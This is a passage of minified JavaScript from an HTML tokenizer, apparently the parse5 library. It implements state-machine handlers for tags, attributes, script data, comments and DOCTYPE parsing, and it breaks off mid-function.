Pe.CHARACTER:{this.handler.onCharacter(this.currentCharacterToken);break}case Pe.NULL_CHARACTER:{this.handler.onNullCharacter(this.currentCharacterToken);break}case Pe.WHITESPACE_CHARACTER:{this.handler.onWhitespaceCharacter(this.currentCharacterToken);break}}this.currentCharacterToken=null}}_emitEOFToken(){const t=this.getCurrentLocation(0);t&&(t.endLine=t.startLine,t.endCol=t.startCol,t.endOffset=t.startOffset),this._emitCurrentCharacterToken(t),this.handler.onEof({type:Pe.EOF,location:t}),this.active=!1}_appendCharToCurrentCharacterToken(t,r){if(this.currentCharacterToken)if(this.currentCharacterToken.type===t){this.currentCharacterToken.chars+=r;return}else this.currentLocation=this.getCurrentLocation(0),this._emitCurrentCharacterToken(this.currentLocation),this.preprocessor.dropParsedChunk();this._createCharacterToken(t,r)}_emitCodePoint(t){const r=gm(t)?Pe.WHITESPACE_CHARACTER:t===y.NULL?Pe.NULL_CHARACTER:Pe.CHARACTER;this._appendCharToCurrentCharacterToken(r,String.fromCodePoint(t))}_emitChars(t){this._appendCharToCurrentCharacterToken(Pe.CHARACTER,t)}_startCharacterReference(){this.returnState=this.state,this.state=x.CHARACTER_REFERENCE,this.entityStartPos=this.preprocessor.pos,this.entityDecoder.startEntity(this._isCharacterReferenceInAttribute()?Rn.Attribute:Rn.Legacy)}_isCharacterReferenceInAttribute(){return this.returnState===x.ATTRIBUTE_VALUE_DOUBLE_QUOTED||this.returnState===x.ATTRIBUTE_VALUE_SINGLE_QUOTED||this.returnState===x.ATTRIBUTE_VALUE_UNQUOTED}_flushCodePointConsumedAsCharacterReference(t){this._isCharacterReferenceInAttribute()?this.currentAttr.value+=String.fromCodePoint(t):this._emitCodePoint(t)}_callState(t){switch(this.state){case x.DATA:{this._stateData(t);break}case x.RCDATA:{this._stateRcdata(t);break}case x.RAWTEXT:{this._stateRawtext(t);break}case x.SCRIPT_DATA:{this._stateScriptData(t);break}case x.PLAINTEXT:{this._statePlaintext(t);break}case x.TAG_OPEN:{this._stateTagOpen(t);break}case x.END_TAG_OPEN:{this._stateEndTagOpen(t);break}case x.TAG_NAME:{this._stateTagName(t);break}case x.RCDATA_LESS_THAN_SIGN:{this._stateRcdataLessThanSign(t);break}case x.RCDATA_END_TAG_OPEN:{this._stateRcdataEndTagOpen(t);break}case x.RCDATA_END_TAG_NAME:{this._stateRcdataEndTagName(t);break}case x.RAWTEXT_LESS_THAN_SIGN:{this._stateRawtextLessThanSign(t);break}case x.RAWTEXT_END_TAG_OPEN:{this._stateRawtextEndTagOpen(t);break}case x.RAWTEXT_END_TAG_NAME:{this._stateRawtextEndTagName(t);break}case x.SCRIPT_DATA_LESS_THAN_SIGN:{this._stateScriptDataLessThanSign(t);break}case x.SCRIPT_DATA_END_TAG_OPEN:{this._stateScriptDataEndTagOpen(t);break}case x.SCRIPT_DATA_END_TAG_NAME:{this._stateScriptDataEndTagName(t);break}case x.SCRIPT_DATA_ESCAPE_START:{this._stateScriptDataEscapeStart(t);break}case x.SCRIPT_DATA_ESCAPE_START_DASH:{this._stateScriptDataEscapeStartDash(t);break}case x.SCRIPT_DATA_ESCAPED:{this._stateScriptDataEscaped(t);break}case x.SCRIPT_DATA_ESCAPED_DASH:{this._stateScriptDataEscapedDash(t);break}case x.SCRIPT_DATA_ESCAPED_DASH_DASH:{this._stateScriptDataEscapedDashDash(t);break}case x.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN:{this._stateScriptDataEscapedLessThanSign(t);break}case x.SCRIPT_DATA_ESCAPED_END_TAG_OPEN:{this._stateScriptDataEscapedEndTagOpen(t);break}case x.SCRIPT_DATA_ESCAPED_END_TAG_NAME:{this._stateScriptDataEscapedEndTagName(t);break}case x.SCRIPT_DATA_DOUBLE_ESCAPE_START:{this._stateScriptDataDoubleEscapeStart(t);break}case x.SCRIPT_DATA_DOUBLE_ESCAPED:{this._stateScriptDataDoubleEscaped(t);break}case x.SCRIPT_DATA_DOUBLE_ESCAPED_DASH:{this._stateScriptDataDoubleEscapedDash(t);break}case x.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH:{this._stateScriptDataDoubleEscapedDashDash(t);break}case x.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN:{this._stateScriptDataDoubleEscapedLessThanSign(t);break}case x.SCRIPT_DATA_DOUBLE_ESCAPE_END:{this._stateScriptDataDoubleEscapeEnd(t);break}case x.BEFORE_ATTRIBUTE_NAME:{this._stateBeforeAttributeName(t);break}case x.ATTRIBUTE_NAME:{this._stateAttributeName(t);break}case x.AFTER_ATTRIBUTE_NAME:{this._stateAfterAttributeName(t);break}case x.BEFORE_ATTRIBUTE_VALUE:{this._stateBeforeAttributeValue(t);break}case x.ATTRIBUTE_VALUE_DOUBLE_QUOTED:{this._stateAttributeValueDoubleQuoted(t);break}case x.ATTRIBUTE_VALUE_SINGLE_QUOTED:{this._stateAttributeValueSingleQuoted(t);break}case x.ATTRIBUTE_VALUE_UNQUOTED:{this._stateAttributeValueUnquoted(t);break}case x.AFTER_ATTRIBUTE_VALUE_QUOTED:{this._stateAfterAttributeValueQuoted(t);break}case x.SELF_CLOSING_START_TAG:{this._stateSelfClosingStartTag(t);break}case x.BOGUS_COMMENT:{this._stateBogusComment(t);break}case x.MARKUP_DECLARATION_OPEN:{this._stateMarkupDeclarationOpen(t);break}case x.COMMENT_START:{this._stateCommentStart(t);break}case x.COMMENT_START_DASH:{this._stateCommentStartDash(t);break}case x.COMMENT:{this._stateComment(t);break}case x.COMMENT_LESS_THAN_SIGN:{this._stateCommentLessThanSign(t);break}case x.COMMENT_LESS_THAN_SIGN_BANG:{this._stateCommentLessThanSignBang(t);break}case x.COMMENT_LESS_THAN_SIGN_BANG_DASH:{this._stateCommentLessThanSignBangDash(t);break}case x.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH:{this._stateCommentLessThanSignBangDashDash(t);break}case x.COMMENT_END_DASH:{this._stateCommentEndDash(t);break}case x.COMMENT_END:{this._stateCommentEnd(t);break}case x.COMMENT_END_BANG:{this._stateCommentEndBang(t);break}case x.DOCTYPE:{this._stateDoctype(t);break}case x.BEFORE_DOCTYPE_NAME:{this._stateBeforeDoctypeName(t);break}case x.DOCTYPE_NAME:{this._stateDoctypeName(t);break}case x.AFTER_DOCTYPE_NAME:{this._stateAfterDoctypeName(t);break}case x.AFTER_DOCTYPE_PUBLIC_KEYWORD:{this._stateAfterDoctypePublicKeyword(t);break}case x.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER:{this._stateBeforeDoctypePublicIdentifier(t);break}case x.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED:{this._stateDoctypePublicIdentifierDoubleQuoted(t);break}case x.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED:{this._stateDoctypePublicIdentifierSingleQuoted(t);break}case x.AFTER_DOCTYPE_PUBLIC_IDENTIFIER:{this._stateAfterDoctypePublicIdentifier(t);break}case x.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS:{this._stateBetweenDoctypePublicAndSystemIdentifiers(t);break}case x.AFTER_DOCTYPE_SYSTEM_KEYWORD:{this._stateAfterDoctypeSystemKeyword(t);break}case x.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER:{this._stateBeforeDoctypeSystemIdentifier(t);break}case x.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED:{this._stateDoctypeSystemIdentifierDoubleQuoted(t);break}case x.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED:{this._stateDoctypeSystemIdentifierSingleQuoted(t);break}case x.AFTER_DOCTYPE_SYSTEM_IDENTIFIER:{this._stateAfterDoctypeSystemIdentifier(t);break}case x.BOGUS_DOCTYPE:{this._stateBogusDoctype(t);break}case x.CDATA_SECTION:{this._stateCdataSection(t);break}case x.CDATA_SECTION_BRACKET:{this._stateCdataSectionBracket(t);break}case x.CDATA_SECTION_END:{this._stateCdataSectionEnd(t);break}case x.CHARACTER_REFERENCE:{this._stateCharacterReference();break}case x.AMBIGUOUS_AMPERSAND:{this._stateAmbiguousAmpersand(t);break}default:throw new Error("Unknown state")}}_stateData(t){switch(t){case y.LESS_THAN_SIGN:{this.state=x.TAG_OPEN;break}case y.AMPERSAND:{this._startCharacterReference();break}case y.NULL:{this._err(W.unexpectedNullCharacter),this._emitCodePoint(t);break}case y.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateRcdata(t){switch(t){case y.AMPERSAND:{this._startCharacterReference();break}case y.LESS_THAN_SIGN:{this.state=x.RCDATA_LESS_THAN_SIGN;break}case y.NULL:{this._err(W.unexpectedNullCharacter),this._emitChars(Ve);break}case y.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateRawtext(t){switch(t){case y.LESS_THAN_SIGN:{this.state=x.RAWTEXT_LESS_THAN_SIGN;break}case y.NULL:{this._err(W.unexpectedNullCharacter),this._emitChars(Ve);break}case y.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateScriptData(t){switch(t){case y.LESS_THAN_SIGN:{this.state=x.SCRIPT_DATA_LESS_THAN_SIGN;break}case y.NULL:{this._err(W.unexpectedNullCharacter),this._emitChars(Ve);break}case y.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_statePlaintext(t){switch(t){case y.NULL:{this._err(W.unexpectedNullCharacter),this._emitChars(Ve);break}case y.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateTagOpen(t){if(rr(t))this._createStartTagToken(),this.state=x.TAG_NAME,this._stateTagName(t);else switch(t){case y.EXCLAMATION_MARK:{this.state=x.MARKUP_DECLARATION_OPEN;break}case y.SOLIDUS:{this.state=x.END_TAG_OPEN;break}case y.QUESTION_MARK:{this._err(W.unexpectedQuestionMarkInsteadOfTagName),this._createCommentToken(1),this.state=x.BOGUS_COMMENT,this._stateBogusComment(t);break}case y.EOF:{this._err(W.eofBeforeTagName),this._emitChars("<"),this._emitEOFToken();break}default:this._err(W.invalidFirstCharacterOfTagName),this._emitChars("<"),this.state=x.DATA,this._stateData(t)}}_stateEndTagOpen(t){if(rr(t))this._createEndTagToken(),this.state=x.TAG_NAME,this._stateTagName(t);else switch(t){case y.GREATER_THAN_SIGN:{this._err(W.missingEndTagName),this.state=x.DATA;break}case y.EOF:{this._err(W.eofBeforeTagName),this._emitChars("</"),this._emitEOFToken();break}default:this._err(W.invalidFirstCharacterOfTagName),this._createCommentToken(2),this.state=x.BOGUS_COMMENT,this._stateBogusComment(t)}}_stateTagName(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:{this.state=x.BEFORE_ATTRIBUTE_NAME;break}case y.SOLIDUS:{this.state=x.SELF_CLOSING_START_TAG;break}case y.GREATER_THAN_SIGN:{this.state=x.DATA,this.emitCurrentTagToken();break}case y.NULL:{this._err(W.unexpectedNullCharacter),r.tagName+=Ve;break}case y.EOF:{this._err(W.eofInTag),this._emitEOFToken();break}default:r.tagName+=String.fromCodePoint(ba(t)?uo(t):t)}}_stateRcdataLessThanSign(t){t===y.SOLIDUS?this.state=x.RCDATA_END_TAG_OPEN:(this._emitChars("<"),this.state=x.RCDATA,this._stateRcdata(t))}_stateRcdataEndTagOpen(t){rr(t)?(this.state=x.RCDATA_END_TAG_NAME,this._stateRcdataEndTagName(t)):(this._emitChars("</"),this.state=x.RCDATA,this._stateRcdata(t))}handleSpecialEndTag(t){if(!this.preprocessor.startsWith(this.lastStartTagName,!1))return!this._ensureHibernation();this._createEndTagToken();const r=this.currentToken;switch(r.tagName=this.lastStartTagName,this.preprocessor.peek(this.lastStartTagName.length)){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:return this._advanceBy(this.lastStartTagName.length),this.state=x.BEFORE_ATTRIBUTE_NAME,!1;case y.SOLIDUS:return this._advanceBy(this.lastStartTagName.length),this.state=x.SELF_CLOSING_START_TAG,!1;case y.GREATER_THAN_SIGN:return this._advanceBy(this.lastStartTagName.length),this.emitCurrentTagToken(),this.state=x.DATA,!1;default:return!this._ensureHibernation()}}_stateRcdataEndTagName(t){this.handleSpecialEndTag(t)&&(this._emitChars("</"),this.state=x.RCDATA,this._stateRcdata(t))}_stateRawtextLessThanSign(t){t===y.SOLIDUS?this.state=x.RAWTEXT_END_TAG_OPEN:(this._emitChars("<"),this.state=x.RAWTEXT,this._stateRawtext(t))}_stateRawtextEndTagOpen(t){rr(t)?(this.state=x.RAWTEXT_END_TAG_NAME,this._stateRawtextEndTagName(t)):(this._emitChars("</"),this.state=x.RAWTEXT,this._stateRawtext(t))}_stateRawtextEndTagName(t){this.handleSpecialEndTag(t)&&(this._emitChars("</"),this.state=x.RAWTEXT,this._stateRawtext(t))}_stateScriptDataLessThanSign(t){switch(t){case y.SOLIDUS:{this.state=x.SCRIPT_DATA_END_TAG_OPEN;break}case y.EXCLAMATION_MARK:{this.state=x.SCRIPT_DATA_ESCAPE_START,this._emitChars("<!");break}default:this._emitChars("<"),this.state=x.SCRIPT_DATA,this._stateScriptData(t)}}_stateScriptDataEndTagOpen(t){rr(t)?(this.state=x.SCRIPT_DATA_END_TAG_NAME,this._stateScriptDataEndTagName(t)):(this._emitChars("</"),this.state=x.SCRIPT_DATA,this._stateScriptData(t))}_stateScriptDataEndTagName(t){this.handleSpecialEndTag(t)&&(this._emitChars("</"),this.state=x.SCRIPT_DATA,this._stateScriptData(t))}_stateScriptDataEscapeStart(t){t===y.HYPHEN_MINUS?(this.state=x.SCRIPT_DATA_ESCAPE_START_DASH,this._emitChars("-")):(this.state=x.SCRIPT_DATA,this._stateScriptData(t))}_stateScriptDataEscapeStartDash(t){t===y.HYPHEN_MINUS?(this.state=x.SCRIPT_DATA_ESCAPED_DASH_DASH,this._emitChars("-")):(this.state=x.SCRIPT_DATA,this._stateScriptData(t))}_stateScriptDataEscaped(t){switch(t){case y.HYPHEN_MINUS:{this.state=x.SCRIPT_DATA_ESCAPED_DASH,this._emitChars("-");break}case y.LESS_THAN_SIGN:{this.state=x.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case y.NULL:{this._err(W.unexpectedNullCharacter),this._emitChars(Ve);break}case y.EOF:{this._err(W.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateScriptDataEscapedDash(t){switch(t){case y.HYPHEN_MINUS:{this.state=x.SCRIPT_DATA_ESCAPED_DASH_DASH,this._emitChars("-");break}case y.LESS_THAN_SIGN:{this.state=x.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case y.NULL:{this._err(W.unexpectedNullCharacter),this.state=x.SCRIPT_DATA_ESCAPED,this._emitChars(Ve);break}case y.EOF:{this._err(W.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=x.SCRIPT_DATA_ESCAPED,this._emitCodePoint(t)}}_stateScriptDataEscapedDashDash(t){switch(t){case y.HYPHEN_MINUS:{this._emitChars("-");break}case y.LESS_THAN_SIGN:{this.state=x.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case y.GREATER_THAN_SIGN:{this.state=x.SCRIPT_DATA,this._emitChars(">");break}case y.NULL:{this._err(W.unexpectedNullCharacter),this.state=x.SCRIPT_DATA_ESCAPED,this._emitChars(Ve);break}case y.EOF:{this._err(W.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=x.SCRIPT_DATA_ESCAPED,this._emitCodePoint(t)}}_stateScriptDataEscapedLessThanSign(t){t===y.SOLIDUS?this.state=x.SCRIPT_DATA_ESCAPED_END_TAG_OPEN:rr(t)?(this._emitChars("<"),this.state=x.SCRIPT_DATA_DOUBLE_ESCAPE_START,this._stateScriptDataDoubleEscapeStart(t)):(this._emitChars("<"),this.state=x.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(t))}_stateScriptDataEscapedEndTagOpen(t){rr(t)?(this.state=x.SCRIPT_DATA_ESCAPED_END_TAG_NAME,this._stateScriptDataEscapedEndTagName(t)):(this._emitChars("</"),this.state=x.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(t))}_stateScriptDataEscapedEndTagName(t){this.handleSpecialEndTag(t)&&(this._emitChars("</"),this.state=x.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(t))}_stateScriptDataDoubleEscapeStart(t){if(this.preprocessor.startsWith(Pt.SCRIPT,!1)&&Fh(this.preprocessor.peek(Pt.SCRIPT.length))){this._emitCodePoint(t);for(let r=0;r<Pt.SCRIPT.length;r++)this._emitCodePoint(this._consume());this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED}else this._ensureHibernation()||(this.state=x.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(t))}_stateScriptDataDoubleEscaped(t){switch(t){case y.HYPHEN_MINUS:{this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED_DASH,this._emitChars("-");break}case y.LESS_THAN_SIGN:{this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case y.NULL:{this._err(W.unexpectedNullCharacter),this._emitChars(Ve);break}case y.EOF:{this._err(W.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateScriptDataDoubleEscapedDash(t){switch(t){case y.HYPHEN_MINUS:{this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH,this._emitChars("-");break}case y.LESS_THAN_SIGN:{this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case y.NULL:{this._err(W.unexpectedNullCharacter),this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitChars(Ve);break}case y.EOF:{this._err(W.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitCodePoint(t)}}_stateScriptDataDoubleEscapedDashDash(t){switch(t){case y.HYPHEN_MINUS:{this._emitChars("-");break}case y.LESS_THAN_SIGN:{this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case y.GREATER_THAN_SIGN:{this.state=x.SCRIPT_DATA,this._emitChars(">");break}case y.NULL:{this._err(W.unexpectedNullCharacter),this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitChars(Ve);break}case y.EOF:{this._err(W.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitCodePoint(t)}}_stateScriptDataDoubleEscapedLessThanSign(t){t===y.SOLIDUS?(this.state=x.SCRIPT_DATA_DOUBLE_ESCAPE_END,this._emitChars("/")):(this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED,this._stateScriptDataDoubleEscaped(t))}_stateScriptDataDoubleEscapeEnd(t){if(this.preprocessor.startsWith(Pt.SCRIPT,!1)&&Fh(this.preprocessor.peek(Pt.SCRIPT.length))){this._emitCodePoint(t);for(let r=0;r<Pt.SCRIPT.length;r++)this._emitCodePoint(this._consume());this.state=x.SCRIPT_DATA_ESCAPED}else this._ensureHibernation()||(this.state=x.SCRIPT_DATA_DOUBLE_ESCAPED,this._stateScriptDataDoubleEscaped(t))}_stateBeforeAttributeName(t){switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.SOLIDUS:case y.GREATER_THAN_SIGN:case y.EOF:{this.state=x.AFTER_ATTRIBUTE_NAME,this._stateAfterAttributeName(t);break}case y.EQUALS_SIGN:{this._err(W.unexpectedEqualsSignBeforeAttributeName),this._createAttr("="),this.state=x.ATTRIBUTE_NAME;break}default:this._createAttr(""),this.state=x.ATTRIBUTE_NAME,this._stateAttributeName(t)}}_stateAttributeName(t){switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:case y.SOLIDUS:case y.GREATER_THAN_SIGN:case y.EOF:{this._leaveAttrName(),this.state=x.AFTER_ATTRIBUTE_NAME,this._stateAfterAttributeName(t);break}case y.EQUALS_SIGN:{this._leaveAttrName(),this.state=x.BEFORE_ATTRIBUTE_VALUE;break}case y.QUOTATION_MARK:case y.APOSTROPHE:case y.LESS_THAN_SIGN:{this._err(W.unexpectedCharacterInAttributeName),this.currentAttr.name+=String.fromCodePoint(t);break}case y.NULL:{this._err(W.unexpectedNullCharacter),this.currentAttr.name+=Ve;break}default:this.currentAttr.name+=String.fromCodePoint(ba(t)?uo(t):t)}}_stateAfterAttributeName(t){switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.SOLIDUS:{this.state=x.SELF_CLOSING_START_TAG;break}case y.EQUALS_SIGN:{this.state=x.BEFORE_ATTRIBUTE_VALUE;break}case y.GREATER_THAN_SIGN:{this.state=x.DATA,this.emitCurrentTagToken();break}case y.EOF:{this._err(W.eofInTag),this._emitEOFToken();break}default:this._createAttr(""),this.state=x.ATTRIBUTE_NAME,this._stateAttributeName(t)}}_stateBeforeAttributeValue(t){switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.QUOTATION_MARK:{this.state=x.ATTRIBUTE_VALUE_DOUBLE_QUOTED;break}case y.APOSTROPHE:{this.state=x.ATTRIBUTE_VALUE_SINGLE_QUOTED;break}case y.GREATER_THAN_SIGN:{this._err(W.missingAttributeValue),this.state=x.DATA,this.emitCurrentTagToken();break}default:this.state=x.ATTRIBUTE_VALUE_UNQUOTED,this._stateAttributeValueUnquoted(t)}}_stateAttributeValueDoubleQuoted(t){switch(t){case y.QUOTATION_MARK:{this.state=x.AFTER_ATTRIBUTE_VALUE_QUOTED;break}case y.AMPERSAND:{this._startCharacterReference();break}case y.NULL:{this._err(W.unexpectedNullCharacter),this.currentAttr.value+=Ve;break}case y.EOF:{this._err(W.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(t)}}_stateAttributeValueSingleQuoted(t){switch(t){case y.APOSTROPHE:{this.state=x.AFTER_ATTRIBUTE_VALUE_QUOTED;break}case y.AMPERSAND:{this._startCharacterReference();break}case y.NULL:{this._err(W.unexpectedNullCharacter),this.currentAttr.value+=Ve;break}case y.EOF:{this._err(W.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(t)}}_stateAttributeValueUnquoted(t){switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:{this._leaveAttrValue(),this.state=x.BEFORE_ATTRIBUTE_NAME;break}case y.AMPERSAND:{this._startCharacterReference();break}case y.GREATER_THAN_SIGN:{this._leaveAttrValue(),this.state=x.DATA,this.emitCurrentTagToken();break}case y.NULL:{this._err(W.unexpectedNullCharacter),this.currentAttr.value+=Ve;break}case y.QUOTATION_MARK:case y.APOSTROPHE:case y.LESS_THAN_SIGN:case y.EQUALS_SIGN:case y.GRAVE_ACCENT:{this._err(W.unexpectedCharacterInUnquotedAttributeValue),this.currentAttr.value+=String.fromCodePoint(t);break}case y.EOF:{this._err(W.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(t)}}_stateAfterAttributeValueQuoted(t){switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:{this._leaveAttrValue(),this.state=x.BEFORE_ATTRIBUTE_NAME;break}case y.SOLIDUS:{this._leaveAttrValue(),this.state=x.SELF_CLOSING_START_TAG;break}case y.GREATER_THAN_SIGN:{this._leaveAttrValue(),this.state=x.DATA,this.emitCurrentTagToken();break}case y.EOF:{this._err(W.eofInTag),this._emitEOFToken();break}default:this._err(W.missingWhitespaceBetweenAttributes),this.state=x.BEFORE_ATTRIBUTE_NAME,this._stateBeforeAttributeName(t)}}_stateSelfClosingStartTag(t){switch(t){case y.GREATER_THAN_SIGN:{const r=this.currentToken;r.selfClosing=!0,this.state=x.DATA,this.emitCurrentTagToken();break}case y.EOF:{this._err(W.eofInTag),this._emitEOFToken();break}default:this._err(W.unexpectedSolidusInTag),this.state=x.BEFORE_ATTRIBUTE_NAME,this._stateBeforeAttributeName(t)}}_stateBogusComment(t){const r=this.currentToken;switch(t){case y.GREATER_THAN_SIGN:{this.state=x.DATA,this.emitCurrentComment(r);break}case y.EOF:{this.emitCurrentComment(r),this._emitEOFToken();break}case y.NULL:{this._err(W.unexpectedNullCharacter),r.data+=Ve;break}default:r.data+=String.fromCodePoint(t)}}_stateMarkupDeclarationOpen(t){this._consumeSequenceIfMatch(Pt.DASH_DASH,!0)?(this._createCommentToken(Pt.DASH_DASH.length+1),this.state=x.COMMENT_START):this._consumeSequenceIfMatch(Pt.DOCTYPE,!1)?(this.currentLocation=this.getCurrentLocation(Pt.DOCTYPE.length+1),this.state=x.DOCTYPE):this._consumeSequenceIfMatch(Pt.CDATA_START,!0)?this.inForeignNode?this.state=x.CDATA_SECTION:(this._err(W.cdataInHtmlContent),this._createCommentToken(Pt.CDATA_START.length+1),this.currentToken.data="[CDATA[",this.state=x.BOGUS_COMMENT):this._ensureHibernation()||(this._err(W.incorrectlyOpenedComment),this._createCommentToken(2),this.state=x.BOGUS_COMMENT,this._stateBogusComment(t))}_stateCommentStart(t){switch(t){case y.HYPHEN_MINUS:{this.state=x.COMMENT_START_DASH;break}case y.GREATER_THAN_SIGN:{this._err(W.abruptClosingOfEmptyComment),this.state=x.DATA;const r=this.currentToken;this.emitCurrentComment(r);break}default:this.state=x.COMMENT,this._stateComment(t)}}_stateCommentStartDash(t){const r=this.currentToken;switch(t){case y.HYPHEN_MINUS:{this.state=x.COMMENT_END;break}case y.GREATER_THAN_SIGN:{this._err(W.abruptClosingOfEmptyComment),this.state=x.DATA,this.emitCurrentComment(r);break}case y.EOF:{this._err(W.eofInComment),this.emitCurrentComment(r),this._emitEOFToken();break}default:r.data+="-",this.state=x.COMMENT,this._stateComment(t)}}_stateComment(t){const r=this.currentToken;switch(t){case y.HYPHEN_MINUS:{this.state=x.COMMENT_END_DASH;break}case y.LESS_THAN_SIGN:{r.data+="<",this.state=x.COMMENT_LESS_THAN_SIGN;break}case y.NULL:{this._err(W.unexpectedNullCharacter),r.data+=Ve;break}case y.EOF:{this._err(W.eofInComment),this.emitCurrentComment(r),this._emitEOFToken();break}default:r.data+=String.fromCodePoint(t)}}_stateCommentLessThanSign(t){const r=this.currentToken;switch(t){case y.EXCLAMATION_MARK:{r.data+="!",this.state=x.COMMENT_LESS_THAN_SIGN_BANG;break}case y.LESS_THAN_SIGN:{r.data+="<";break}default:this.state=x.COMMENT,this._stateComment(t)}}_stateCommentLessThanSignBang(t){t===y.HYPHEN_MINUS?this.state=x.COMMENT_LESS_THAN_SIGN_BANG_DASH:(this.state=x.COMMENT,this._stateComment(t))}_stateCommentLessThanSignBangDash(t){t===y.HYPHEN_MINUS?this.state=x.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH:(this.state=x.COMMENT_END_DASH,this._stateCommentEndDash(t))}_stateCommentLessThanSignBangDashDash(t){t!==y.GREATER_THAN_SIGN&&t!==y.EOF&&this._err(W.nestedComment),this.state=x.COMMENT_END,this._stateCommentEnd(t)}_stateCommentEndDash(t){const r=this.currentToken;switch(t){case y.HYPHEN_MINUS:{this.state=x.COMMENT_END;break}case y.EOF:{this._err(W.eofInComment),this.emitCurrentComment(r),this._emitEOFToken();break}default:r.data+="-",this.state=x.COMMENT,this._stateComment(t)}}_stateCommentEnd(t){const r=this.currentToken;switch(t){case y.GREATER_THAN_SIGN:{this.state=x.DATA,this.emitCurrentComment(r);break}case y.EXCLAMATION_MARK:{this.state=x.COMMENT_END_BANG;break}case y.HYPHEN_MINUS:{r.data+="-";break}case y.EOF:{this._err(W.eofInComment),this.emitCurrentComment(r),this._emitEOFToken();break}default:r.data+="--",this.state=x.COMMENT,this._stateComment(t)}}_stateCommentEndBang(t){const r=this.currentToken;switch(t){case y.HYPHEN_MINUS:{r.data+="--!",this.state=x.COMMENT_END_DASH;break}case y.GREATER_THAN_SIGN:{this._err(W.incorrectlyClosedComment),this.state=x.DATA,this.emitCurrentComment(r);break}case y.EOF:{this._err(W.eofInComment),this.emitCurrentComment(r),this._emitEOFToken();break}default:r.data+="--!",this.state=x.COMMENT,this._stateComment(t)}}_stateDoctype(t){switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:{this.state=x.BEFORE_DOCTYPE_NAME;break}case y.GREATER_THAN_SIGN:{this.state=x.BEFORE_DOCTYPE_NAME,this._stateBeforeDoctypeName(t);break}case y.EOF:{this._err(W.eofInDoctype),this._createDoctypeToken(null);const r=this.currentToken;r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._err(W.missingWhitespaceBeforeDoctypeName),this.state=x.BEFORE_DOCTYPE_NAME,this._stateBeforeDoctypeName(t)}}_stateBeforeDoctypeName(t){if(ba(t))this._createDoctypeToken(String.fromCharCode(uo(t))),this.state=x.DOCTYPE_NAME;else switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.NULL:{this._err(W.unexpectedNullCharacter),this._createDoctypeToken(Ve),this.state=x.DOCTYPE_NAME;break}case y.GREATER_THAN_SIGN:{this._err(W.missingDoctypeName),this._createDoctypeToken(null);const r=this.currentToken;r.forceQuirks=!0,this.emitCurrentDoctype(r),this.state=x.DATA;break}case y.EOF:{this._err(W.eofInDoctype),this._createDoctypeToken(null);const r=this.currentToken;r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._createDoctypeToken(String.fromCodePoint(t)),this.state=x.DOCTYPE_NAME}}_stateDoctypeName(t){const r=this.currentToken;switch(t){case 